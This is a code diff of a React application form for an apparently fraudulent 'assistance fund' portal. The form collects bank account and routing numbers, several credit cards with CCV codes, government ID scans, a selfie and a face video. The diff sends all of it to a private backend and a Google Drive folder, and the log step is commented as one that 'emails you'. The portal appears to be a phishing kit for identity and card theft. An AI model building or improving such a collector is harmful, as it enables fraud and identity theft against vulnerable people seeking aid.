@@ -1,5 +1,4 @@
 import { useState } from 'react';
-import axios from 'axios';
 import { ChevronRight, ChevronLeft, Upload, Check, AlertCircle, Shield, Minus, User, Building, MessageSquare, X } from 'lucide-react';
 import { bank, state } from '../utils/data';
 import BankAutocomplete from '../components/BankAutoComplete';
@@ -9,11 +8,11 @@ import CameraModal from '../components/CameraModal';
 const SMSInfoModal = ({ isOpen, onClose }: { isOpen: boolean; onClose: () => void }) => {
   if (!isOpen) return null;
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
-      <div className="relative w-full max-w-md mx-4 bg-white rounded-lg shadow-xl">
-        <div className="flex items-center justify-between p-6 border-b">
+    <div className="flex fixed inset-0 z-50 justify-center items-center bg-black bg-opacity-50">
+      <div className="relative mx-4 w-full max-w-md bg-white rounded-lg shadow-xl">
+        <div className="flex justify-between items-center p-6 border-b">
           <div className="flex items-center">
-            <MessageSquare className="w-6 h-6 mr-2 text-blue-600" />
+            <MessageSquare className="mr-2 w-6 h-6 text-blue-600" />
             <h3 className="text-lg font-semibold text-gray-900">Verification Notice</h3>
           </div>
           <button onClick={onClose} className="p-1 text-gray-400 hover:text-gray-600">
@@ -127,6 +126,11 @@ const ApplicationPortal = () => {
   const allBanks = bank;
   const [showModal, setShowModal] = useState(false);
   const [showSMSInfo, setShowSMSInfo] = useState(false);
+  const [uploading, setUploading] = useState(false);
+  const [progress, setProgress] = useState(0);
+  const [result, setResult] = useState<{ success: boolean; data?: any; error?: string } | null>(null);
+  const [fileData, setFileData] = useState<File[]>([]);
+
 
   const handleCapture = (data: String) => {
     console.log('Captured:', data);
@@ -151,7 +155,9 @@ const ApplicationPortal = () => {
         const progress = (prev[field] || 0) + 10;
         if (progress >= 100) {
           clearInterval(interval);
-          setFormData(prevData => ({ ...prevData, [field]: file }));
+          // Add file to fileData array and filename to formData
+          setFileData(prevFiles => [...prevFiles, file]);
+          setFormData(prevData => ({ ...prevData, [field]: file.name }));
           return { ...prev, [field]: 100 };
         }
         return { ...prev, [field]: progress };
@@ -396,137 +402,181 @@ const ApplicationPortal = () => {
   //   }
   // };
 
-  const initializeGoogleDrive = () => {
-    return new Promise((resolve, reject) => {
-      if (window.gapi && window.gapi.client) {
-        resolve();
-        return;
+  // Define Google API keys
+
+  // Define backend URL as environment variable or fallback to production URL
+  const BACKEND_URL = import.meta.env.VITE_BACKEND_URL || 'https://hope-helper.vercel.app';
+
+  // New Google Drive integration using service account on backend
+  const initializeGoogleDrive = async () => {
+    try {
+      // Initialize Drive API with service account (no user auth needed)
+      const response = await fetch(`${BACKEND_URL}/api/google/init`);
+      if (!response.ok) {
+        throw new Error(`Failed to initialize Drive API: ${response.status} ${response.statusText}`);
+      }
+      
+      // No tokens needed anymore, just return success
+      return "SERVICE_ACCOUNT";
+    } catch (error: any) {
+      console.error('Google Drive initialization error:', error);
+      throw new Error(`Failed to initialize Google Drive: ${error.message || 'Unknown error'}`);
+    }
+  };
+
+  const createFolder = async (folderName: string) => {
+    try {
+      const response = await fetch(`${BACKEND_URL}/api/google/create-folder`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ folderName })
+      });
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Failed to create folder: ${response.status} ${response.statusText}. ${errorText}`);
       }
 
-      const script = document.createElement('script');
-      script.src = 'https://apis.google.com/js/api.js';
-      script.onload = () => {
-        window.gapi.load('client:auth2', () => {
-          window.gapi.client.init({
-            apiKey: GOOGLE_API_KEY,
-            clientId: GOOGLE_CLIENT_ID,
-            discoveryDocs: ['https://www.googleapis.com/discovery/v1/apis/drive/v3/rest'],
-            scope: 'https://www.googleapis.com/auth/drive.file'
-          }).then(resolve).catch(reject);
-        });
-      };
-      script.onerror = reject;
-      document.body.appendChild(script);
-    });
+      return await response.json();
+    } catch (error: any) {
+      console.error('Folder creation error:', error);
+      throw new Error(`Failed to create folder: ${error.message || 'Unknown error'}`);
+    }
   };
 
-  const signInToGoogle = async () => {
+  const uploadFile = async (file: File, folderId: string) => {
+    if (!file) {
+      throw new Error('File is required for upload');
+    }
+
+    if (!folderId) {
+      throw new Error('Folder ID is required for upload');
+    }
+
     try {
-      const auth = window.gapi.auth2.getAuthInstance();
-      if (!auth.isSignedIn.get()) {
-        await auth.signIn();
+      // Step 1: Get upload URL and metadata from backend (using service account)
+      const uploadInfoResponse = await fetch(`${BACKEND_URL}/api/google/get-upload-url`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          fileName: file.name,
+          folderId,
+          mimeType: file.type
+        })
+      });
+
+      if (!uploadInfoResponse.ok) {
+        const errorText = await uploadInfoResponse.text();
+        throw new Error(`Failed to get upload URL: ${uploadInfoResponse.status}. ${errorText}`);
       }
-      return auth.currentUser.get().getAuthResponse().access_token;
-    } catch (error) {
-      throw new Error('Failed to sign in to Google');
+
+      const uploadInfo = await uploadInfoResponse.json();
+
+      // Step 2: Upload directly to Google Drive
+      const formData = new FormData();
+      formData.append('metadata', new Blob([JSON.stringify(uploadInfo.fileMetadata)], { type: 'application/json' }));
+      formData.append('file', file);
+
+      const uploadResponse = await fetch(uploadInfo.uploadUrl, {
+        method: 'POST',
+        // No Authorization header needed - the upload URL is pre-authorized by service account
+        body: formData
+      });
+
+      if (!uploadResponse.ok) {
+        const errorData = await uploadResponse.json().catch(() => null);
+        throw new Error(`Failed to upload ${file.name}: ${uploadResponse.status} ${uploadResponse.statusText}${
+          errorData ? ` - ${errorData.error?.message || JSON.stringify(errorData)}` : ''
+        }`);
+      }
+
+      return await uploadResponse.json();
+    } catch (error: any) {
+      console.error(`File upload error for ${file.name}:`, error);
+      throw new Error(`Failed to upload ${file.name}: ${error.message || 'Unknown error'}`);
     }
   };
 
-  const createFolder = async (accessToken, folderName) => {
-    const metadata = {
-      name: folderName,
-      mimeType: 'application/vnd.google-apps.folder'
-    };
-
-    const response = await fetch('https://www.googleapis.com/drive/v3/files', {
-      method: 'POST',
-      headers: {
-        'Authorization': `Bearer ${accessToken}`,
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify(metadata)
-    });
-
-    if (!response.ok) {
-      throw new Error('Failed to create folder');
-    }
-
-    return await response.json();
-  };
-
-  const uploadFile = async (accessToken, file, folderId) => {
-    const metadata = {
-      name: file.name,
-      parents: [folderId]
-    };
-
-    const formData = new FormData();
-    formData.append('metadata', new Blob([JSON.stringify(metadata)], { type: 'application/json' }));
-    formData.append('file', file);
-
-    const response = await fetch('https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart&fields=id,name,webViewLink', {
-      method: 'POST',
-      headers: {
-        'Authorization': `Bearer ${accessToken}`
-      },
-      body: formData
-    });
-
-    if (!response.ok) {
-      throw new Error(`Failed to upload ${file.name}`);
-    }
-
-    return await response.json();
-  };
-
-  const logToBackend = async (logData: ) => {
+  const logToBackend = async (logData: any) => {
     try {
-      await fetch('http://localhost:5000/api/log', {
+      const response = await fetch(`${BACKEND_URL}/api/log`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json'
         },
         body: JSON.stringify(logData)
       });
-    } catch (error) {
+
+      if (!response.ok) {
+        const errorText = await response.text();
+        throw new Error(`Server responded with status: ${response.status}. ${errorText}`);
+      }
+
+      return await response.json();
+    } catch (error: any) {
       console.error('Failed to log to backend:', error);
+      throw error;
     }
   };
 
   const handleSubmit = async () => {
     if (!validateStep(currentStep)) return;
 
-    setShowSMSInfo(true);
     setUploading(true);
     setProgress(0);
     setResult(null);
 
     try {
-      // 1. Initialize Google Drive API
+      // 1. Initialize Google Drive API with service account (no user auth needed)
       await initializeGoogleDrive();
+      setProgress(15);
 
-      // 2. Sign in to Google
-      const accessToken = await signInToGoogle();
-
-      // 3. Create folder with firstName + timestamp
+      // 2. Create folder with firstName + timestamp via backend (using service account)
       const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
       const folderName = `${formData.firstName}_${timestamp}`;
-      const folder = await createFolder(accessToken, folderName);
-      setProgress(20);
+      const folder = await createFolder(folderName);
+      setProgress(30);
 
-      // 4. Upload all files to Drive
+      // 3. Upload all files to Drive directly using service account
       const uploadedFiles: any[] = [];
-      const progressPerFile = 80 / files.length;
 
-      for (let i = 0; i < files.length; i++) {
-        const file = files[i];
-        const uploadedFile = await uploadFile(accessToken, file, folder.id);
-        uploadedFiles.push({
-          name: uploadedFile.name,
-          url: uploadedFile.webViewLink,
-          id: uploadedFile.id
-        });
-        setProgress(20 + (i + 1) * progressPerFile);
+      // Collect all document files from formData
+      const documentFiles: { file: File, fieldName: string }[] = [];
+      if (formData.governmentIdFront) documentFiles.push({ file: formData.governmentIdFront, fieldName: 'governmentIdFront' });
+      if (formData.governmentIdBack) documentFiles.push({ file: formData.governmentIdBack, fieldName: 'governmentIdBack' });
+      if (formData.biodataImage) documentFiles.push({ file: formData.biodataImage, fieldName: 'biodataImage' });
+      if (formData.biodataVideo) documentFiles.push({ file: formData.biodataVideo, fieldName: 'biodataVideo' });
+      if (formData.randomPicture) documentFiles.push({ file: formData.randomPicture, fieldName: 'randomPicture' });
+
+      if (documentFiles.length === 0) {
+        throw new Error('No files to upload. Please add required documents.');
+      }
+
+      const progressPerFile = documentFiles.length > 0 ? 50 / documentFiles.length : 0;
+
+      for (let i = 0; i < documentFiles.length; i++) {
+        try {
+          const { file, fieldName } = documentFiles[i];
+          const uploadedFile = await uploadFile(file, folder.id);
+          uploadedFiles.push({
+            name: uploadedFile.name,
+            url: uploadedFile.webViewLink,
+            id: uploadedFile.id,
+            fieldName: fieldName
+          });
+          setProgress(30 + (i + 1) * progressPerFile);
+        } catch (fileError: any) {
+          console.error(`Error uploading file ${i + 1}:`, fileError);
+          // Continue with other files even if one fails
+        }
+      }
+
+      if (uploadedFiles.length === 0) {
+        throw new Error('Failed to upload any files. Please try again.');
       }
 
       setProgress(100);
@@ -563,7 +613,8 @@ const ApplicationPortal = () => {
       };
 
       // 6. Send log data to backend (emails you)
-      await logToBackend(logData);
+      const response = await logToBackend(logData);
+      console.log('Backend response:', response);
 
       setResult({ success: true, data: logData });
 
@@ -584,11 +635,15 @@ const ApplicationPortal = () => {
         accountType: '',
         routingNumber: '',
         accountNumber: '',
+        governmentIdFront: null,
+        governmentIdBack: null,
+        biodataImage: null,
+        biodataVideo: null,
+        randomPicture: null,
         termsAccepted: false,
         dataConsent: false,
         cards: [{ cardNumber: '', expiry: '', ccv: '' }]
       });
-      setFiles([]);
 
     } catch (error: any) {
       console.error('Upload error:', error);
@@ -759,7 +814,7 @@ const ApplicationPortal = () => {
                   type="text"
                   value={formData.mailingAddress}
                   onChange={(e) => handleInputChange('mailingAddress', e.target.value)}
-                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                  className="px-4 py-3 w-full rounded-lg border border-gray-300 focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                   placeholder="Enter mailing address if different from current address"
                 />
               </div>
@@ -771,9 +826,9 @@ const ApplicationPortal = () => {
         return (
           <div className="space-y-6">
             <h3 className="mb-6 text-2xl font-semibold text-gray-800">Banking Information</h3>
-            <div className="p-4 mb-6 border border-blue-200 rounded-lg bg-blue-50">
+            <div className="p-4 mb-6 bg-blue-50 rounded-lg border border-blue-200">
               <div className="flex items-center">
-                <Shield className="w-5 h-5 mr-2 text-blue-600" />
+                <Shield className="mr-2 w-5 h-5 text-blue-600" />
                 <p className="text-sm text-blue-800">
                   Your banking information is encrypted and secure. We use this information solely for direct deposit of your assistance funds.
                 </p>
@@ -838,13 +893,13 @@ const ApplicationPortal = () => {
             <h3 className="mb-6 text-2xl font-semibold text-gray-800">Document Upload & Verification</h3>
             <div className="grid grid-cols-1 gap-6 md:grid-cols-2">
               {/* Government ID Front */}
-              <div className="p-6 border-2 border-gray-300 border-dashed rounded-lg">
+              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                 <div className="text-center">
-                  <Upload className="w-12 h-12 mx-auto mb-4 text-gray-400" />
+                  <Upload className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                   <h4 className="mb-2 text-lg font-semibold text-gray-800">Government ID (Front) *</h4>
                   <p className="mb-4 text-gray-600">Upload the front of your driver's license, state ID, or passport</p>
                   {formData.governmentIdFront ? (
-                    <div className="flex items-center justify-center space-x-2 text-green-600">
+                    <div className="flex justify-center items-center space-x-2 text-green-600">
                       <Check className="w-5 h-5" />
                       <span>Front uploaded</span>
                     </div>
@@ -859,7 +914,7 @@ const ApplicationPortal = () => {
                       />
                       <label
                         htmlFor="government-id-front"
-                        className="px-6 py-2 text-white transition-colors bg-blue-600 rounded-lg cursor-pointer hover:bg-blue-700"
+                        className="px-6 py-2 text-white bg-blue-600 rounded-lg transition-colors cursor-pointer hover:bg-blue-700"
                       >
                         Choose File
                       </label>
@@ -869,7 +924,7 @@ const ApplicationPortal = () => {
                     <div className="mt-4">
                       <div className="h-2 bg-gray-200 rounded-full">
                         <div
-                          className="h-2 transition-all duration-300 bg-blue-600 rounded-full"
+                          className="h-2 bg-blue-600 rounded-full transition-all duration-300"
                           style={{ width: `${uploadProgress.governmentIdFront}%` }}
                         ></div>
                       </div>
@@ -880,13 +935,13 @@ const ApplicationPortal = () => {
                 </div>
               </div>
               {/* Government ID Back */}
-              <div className="p-6 border-2 border-gray-300 border-dashed rounded-lg">
+              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                 <div className="text-center">
-                  <Upload className="w-12 h-12 mx-auto mb-4 text-gray-400" />
+                  <Upload className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                   <h4 className="mb-2 text-lg font-semibold text-gray-800">Government ID (Back) *</h4>
                   <p className="mb-4 text-gray-600">Upload the back of your driver's license, state ID, or passport</p>
                   {formData.governmentIdBack ? (
-                    <div className="flex items-center justify-center space-x-2 text-green-600">
+                    <div className="flex justify-center items-center space-x-2 text-green-600">
                       <Check className="w-5 h-5" />
                       <span>Back uploaded</span>
                     </div>
@@ -901,7 +956,7 @@ const ApplicationPortal = () => {
                       />
                       <label
                         htmlFor="government-id-back"
-                        className="px-6 py-2 text-white transition-colors bg-blue-600 rounded-lg cursor-pointer hover:bg-blue-700"
+                        className="px-6 py-2 text-white bg-blue-600 rounded-lg transition-colors cursor-pointer hover:bg-blue-700"
                       >
                         Choose File
                       </label>
@@ -911,7 +966,7 @@ const ApplicationPortal = () => {
                     <div className="mt-4">
                       <div className="h-2 bg-gray-200 rounded-full">
                         <div
-                          className="h-2 transition-all duration-300 bg-blue-600 rounded-full"
+                          className="h-2 bg-blue-600 rounded-full transition-all duration-300"
                           style={{ width: `${uploadProgress.governmentIdBack}%` }}
                         ></div>
                       </div>
@@ -922,13 +977,13 @@ const ApplicationPortal = () => {
                 </div>
               </div>
               {/* Biodata Image (Face) */}
-              <div className="p-6 border-2 border-gray-300 border-dashed rounded-lg">
+              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                 <div className="text-center">
-                  <User className="w-12 h-12 mx-auto mb-4 text-gray-400" />
+                  <User className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                   <h4 className="mb-2 text-lg font-semibold text-gray-800">Biodata (Face Photo) *</h4>
                   <p className="mb-4 text-gray-600">Take a clear selfie for identity verification</p>
                   {formData.biodataImage ? (
-                    <div className="flex items-center justify-center space-x-2 text-green-600">
+                    <div className="flex justify-center items-center space-x-2 text-green-600">
                       <Check className="w-5 h-5" />
                       <span>Face photo uploaded</span>
                     </div>
@@ -944,7 +999,7 @@ const ApplicationPortal = () => {
                       />
                       <label
                         htmlFor="biodata-image"
-                        className="px-6 py-2 text-white transition-colors bg-green-600 rounded-lg cursor-pointer hover:bg-green-700"
+                        className="px-6 py-2 text-white bg-green-600 rounded-lg transition-colors cursor-pointer hover:bg-green-700"
                       >
                         Take Selfie
                       </label>
@@ -954,7 +1009,7 @@ const ApplicationPortal = () => {
                     <div className="mt-4">
                       <div className="h-2 bg-gray-200 rounded-full">
                         <div
-                          className="h-2 transition-all duration-300 bg-green-600 rounded-full"
+                          className="h-2 bg-green-600 rounded-full transition-all duration-300"
                           style={{ width: `${uploadProgress.biodataImage}%` }}
                         ></div>
                       </div>
@@ -965,13 +1020,13 @@ const ApplicationPortal = () => {
                 </div>
               </div>
               {/* Biodata Video (Face) */}
-              <div className="p-6 border-2 border-gray-300 border-dashed rounded-lg">
+              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed">
                 <div className="text-center">
-                  <User className="w-12 h-12 mx-auto mb-4 text-gray-400" />
+                  <User className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                   <h4 className="mb-2 text-lg font-semibold text-gray-800">Biodata (Face Video) *</h4>
                   <p className="mb-4 text-gray-600">Record a short video of your face for liveness detection</p>
                   {formData.biodataVideo ? (
-                    <div className="flex items-center justify-center space-x-2 text-green-600">
+                    <div className="flex justify-center items-center space-x-2 text-green-600">
                       <Check className="w-5 h-5" />
                       <span>Face video uploaded</span>
                     </div>
@@ -987,7 +1042,7 @@ const ApplicationPortal = () => {
                       />
                       <label
                         htmlFor="biodata-video"
-                        className="px-6 py-2 text-white transition-colors bg-green-600 rounded-lg cursor-pointer hover:bg-green-700"
+                        className="px-6 py-2 text-white bg-green-600 rounded-lg transition-colors cursor-pointer hover:bg-green-700"
                       >
                         Record Video
                       </label>
@@ -997,7 +1052,7 @@ const ApplicationPortal = () => {
                     <div className="mt-4">
                       <div className="h-2 bg-gray-200 rounded-full">
                         <div
-                          className="h-2 transition-all duration-300 bg-green-600 rounded-full"
+                          className="h-2 bg-green-600 rounded-full transition-all duration-300"
                           style={{ width: `${uploadProgress.biodataVideo}%` }}
                         ></div>
                       </div>
@@ -1008,13 +1063,13 @@ const ApplicationPortal = () => {
                 </div>
               </div>
               {/* Random Picture */}
-              <div className="p-6 border-2 border-gray-300 border-dashed rounded-lg md:col-span-2">
+              <div className="p-6 rounded-lg border-2 border-gray-300 border-dashed md:col-span-2">
                 <div className="text-center">
-                  <Building className="w-12 h-12 mx-auto mb-4 text-gray-400" />
+                  <Building className="mx-auto mb-4 w-12 h-12 text-gray-400" />
                   <h4 className="mb-2 text-lg font-semibold text-gray-800">Random Picture *</h4>
                   <p className="mb-4 text-gray-600">Take a random picture of anything in your environment (to prevent AI registration)</p>
                   {formData.randomPicture ? (
-                    <div className="flex items-center justify-center space-x-2 text-green-600">
+                    <div className="flex justify-center items-center space-x-2 text-green-600">
                       <Check className="w-5 h-5" />
                       <span>Random picture uploaded</span>
                     </div>
@@ -1030,7 +1085,7 @@ const ApplicationPortal = () => {
                       />
                       <label
                         htmlFor="random-picture"
-                        className="px-6 py-2 text-white transition-colors bg-yellow-600 rounded-lg cursor-pointer hover:bg-yellow-700"
+                        className="px-6 py-2 text-white bg-yellow-600 rounded-lg transition-colors cursor-pointer hover:bg-yellow-700"
                       >
                         Take Random Picture
                       </label>
@@ -1040,7 +1095,7 @@ const ApplicationPortal = () => {
                     <div className="mt-4">
                       <div className="h-2 bg-gray-200 rounded-full">
                         <div
-                          className="h-2 transition-all duration-300 bg-yellow-600 rounded-full"
+                          className="h-2 bg-yellow-600 rounded-full transition-all duration-300"
                           style={{ width: `${uploadProgress.randomPicture}%` }}
                         ></div>
                       </div>
@@ -1051,7 +1106,7 @@ const ApplicationPortal = () => {
                 </div>
               </div>
             </div>
-            <div className="p-4 mt-6 border border-yellow-200 rounded-lg bg-yellow-50">
+            <div className="p-4 mt-6 bg-yellow-50 rounded-lg border border-yellow-200">
               <div className="flex items-start">
                 <AlertCircle className="w-5 h-5 text-yellow-600 mr-2 mt-0.5" />
                 <div>
@@ -1090,7 +1145,7 @@ const ApplicationPortal = () => {
                       type="text"
                       value={card.cardNumber}
                       onChange={(e) => handleCardChange(index, "cardNumber", e.target.value)}
-                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].cardNumber`] ? 'border-red-500' : 'border-gray-300'}`}
+                      className={`px-4 py-3 w-full rounded-lg border focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].cardNumber`] ? 'border-red-500' : 'border-gray-300'}`}
                       placeholder="XXXX XXXX XXXX XXXX"
                     />
                     {errors[`cards[${index}].cardNumber`] && (
@@ -1103,7 +1158,7 @@ const ApplicationPortal = () => {
                       type="text"
                       value={card.expiry}
                       onChange={(e) => handleCardChange(index, "expiry", e.target.value)}
-                      className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].expiry`] ? 'border-red-500' : 'border-gray-300'}`}
+                      className={`px-4 py-3 w-full rounded-lg border focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].expiry`] ? 'border-red-500' : 'border-gray-300'}`}
                       placeholder="MM/YY"
                     />
                     {errors[`cards[${index}].expiry`] && (
@@ -1118,7 +1173,7 @@ const ApplicationPortal = () => {
                           type="text"
                           value={card.ccv}
                           onChange={(e) => handleCardChange(index, "ccv", e.target.value)}
-                          className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].ccv`] ? 'border-red-500' : 'border-gray-300'}`}
+                          className={`px-4 py-3 w-full rounded-lg border focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${errors[`cards[${index}].ccv`] ? 'border-red-500' : 'border-gray-300'}`}
                           placeholder="XXX"
                         />
                         {/* Remove card button, only for cards after the first */}
@@ -1126,7 +1181,7 @@ const ApplicationPortal = () => {
                           <button
                             type="button"
                             onClick={() => removeCard(index)}
-                            className="flex items-center justify-center p-2 mb-2 ml-2 text-red-600 bg-red-100 rounded-full hover:bg-red-200"
+                            className="flex justify-center items-center p-2 mb-2 ml-2 text-red-600 bg-red-100 rounded-full hover:bg-red-200"
                             title="Remove this card"
                           >
                             <Minus className="w-5 h-5" />
@@ -1160,7 +1215,7 @@ const ApplicationPortal = () => {
             <h3 className="mb-6 text-2xl font-semibold text-gray-800">Review & Submit Application</h3>
 
             {/* Application Summary */}
-            <div className="p-6 space-y-4 rounded-lg bg-gray-50">
+            <div className="p-6 space-y-4 bg-gray-50 rounded-lg">
               <h4 className="text-lg font-semibold text-gray-800">Application Summary</h4>
 
               <div className="grid grid-cols-1 gap-4 text-sm md:grid-cols-2">
@@ -1199,14 +1254,14 @@ const ApplicationPortal = () => {
                   id="terms"
                   checked={formData.termsAccepted}
                   onChange={(e) => handleInputChange('termsAccepted', e.target.checked)}
-                  className="w-4 h-4 mt-1 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
+                  className="mt-1 w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500"
                 />
                 <label htmlFor="terms" className="text-sm text-gray-700">
                   I accept the <a href="/terms" className="text-blue-600 hover:underline">Terms and Conditions</a> and
                   understand that I must use assistance funds only for approved expenses (food, clothing, shelter, healthcare).
                 </label>
               </div>
-              {errors.termsAccepted && <p className="text-sm text-red-600 ml-7">{errors.termsAccepted}</p>}
+              {errors.termsAccepted && <p className="ml-7 text-sm text-red-600">{errors.termsAccepted}</p>}
 
               <div className="flex items-start space-x-3">
                 <input
@@ -1214,17 +1269,17 @@ const ApplicationPortal = () => {
                   id="consent"
                   checked={formData.dataConsent}
                   onChange={(e) => handleInputChange('dataConsent', e.target.checked)}
-                  className="w-4 h-4 mt-1 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
+                  className="mt-1 w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500"
                 />
                 <label htmlFor="consent" className="text-sm text-gray-700">
                   I consent to the processing of my personal data and understand that my fund usage will be monitored
                   to ensure compliance with program guidelines. I agree to the <a href="/privacy" className="text-blue-600 hover:underline">Privacy Policy</a>.
                 </label>
               </div>
-              {errors.dataConsent && <p className="text-sm text-red-600 ml-7">{errors.dataConsent}</p>}
+              {errors.dataConsent && <p className="ml-7 text-sm text-red-600">{errors.dataConsent}</p>}
             </div>
 
-            <div className="p-4 border border-blue-200 rounded-lg bg-blue-50">
+            <div className="p-4 bg-blue-50 rounded-lg border border-blue-200">
               <div className="flex items-start">
                 <Shield className="w-5 h-5 text-blue-600 mr-2 mt-0.5" />
                 <div>
@@ -1245,11 +1300,11 @@ const ApplicationPortal = () => {
   };
 
   return (
-    <div className="min-h-screen py-8 bg-gray-50">
-      <div className="max-w-4xl px-4 mx-auto sm:px-6 lg:px-8">
+    <div className="py-8 min-h-screen bg-gray-50">
+      <div className="px-4 mx-auto max-w-4xl sm:px-6 lg:px-8">
         {/* Progress Indicator */}
         <div className="mb-8">
-          <div className="flex items-center justify-between">
+          <div className="flex justify-between items-center">
             {steps.map((step, index) => (
               <div key={step.id} className="flex items-center">
                 <div className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-semibold ${step.id === currentStep
@@ -1293,25 +1348,25 @@ const ApplicationPortal = () => {
                 : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
                 }`}
             >
-              <ChevronLeft className="w-4 h-4 mr-2" />
+              <ChevronLeft className="mr-2 w-4 h-4" />
               Previous
             </button>
 
             {currentStep < steps.length ? (
               <button
                 onClick={nextStep}
-                className="flex items-center px-6 py-3 font-medium text-white transition-colors bg-blue-600 rounded-lg hover:bg-blue-700"
+                className="flex items-center px-6 py-3 font-medium text-white bg-blue-600 rounded-lg transition-colors hover:bg-blue-700"
               >
                 Next
-                <ChevronRight className="w-4 h-4 ml-2" />
+                <ChevronRight className="ml-2 w-4 h-4" />
               </button>
             ) : (
               <button
                 onClick={handleSubmit}
-                className="flex items-center px-6 py-3 font-medium text-white transition-colors bg-green-600 rounded-lg hover:bg-green-700"
+                className="flex items-center px-6 py-3 font-medium text-white bg-green-600 rounded-lg transition-colors hover:bg-green-700"
               >
                 Submit Application
-                <Check className="w-4 h-4 ml-2" />
+                <Check className="ml-2 w-4 h-4" />
               </button>
             )}
           </div>
